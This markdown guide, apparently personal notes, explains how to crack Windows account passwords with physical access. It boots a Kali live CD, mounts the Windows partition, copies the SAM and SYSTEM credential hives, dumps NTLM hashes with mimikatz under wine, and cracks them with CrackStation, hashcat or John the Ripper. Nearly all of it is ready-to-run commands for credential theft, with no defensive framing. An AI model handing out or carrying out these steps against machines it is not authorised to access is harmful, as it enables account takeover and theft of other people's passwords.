# Windows

## Cracking Windows Passwords

1. Boot into [Kali Linux](https://www.kali.org/) live CD
1. Connect to WiFi
1. Enable SSH:

   ```bash
   sudo systemctl enable ssh
   sudo systemctl start ssh
   ```

1. Set password for kali user:

   ```bash
   sudo passwd kali
   ```

1. SSH to the machine from local workstation
1. Mount the Windows filesystem

   ```bash
   sudo mkdir -p /mnt/windows
   sudo mount $(sudo fdisk -l | grep "Microsoft basic data" | awk '{print $1}') /mnt/windows
   ```

1. Extract SYSTEM and SAM files

   ```bash
   cp /mnt/windows/Windows/System32/config/SAM /tmp/SAM
   cp /mnt/windows/Windows/System32/config/SYSTEM /tmp/SYSTEM
   cd /tmp
   ```

1. Install `wine`

  ```bash
  sudo timedatectl set-timezone America/Detroit
  sudo timedatectl set-ntp on
  sudo apt update
  sudo apt install -y wine
  ```

1. Run `mimikatz`

  ```bash
  wine /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
  lsadump::sam /system:/tmp/SYSTEM /sam:/tmp/SAM
  ```

1. There should be a line that says `User : ${USER}`, with a line below it saying `Hash NTLM: `. Grab this hash and use rainbow tables from [Crack Station](https://crackstation.net/) or hashcat, john the ripper, etc. to crack the hash.
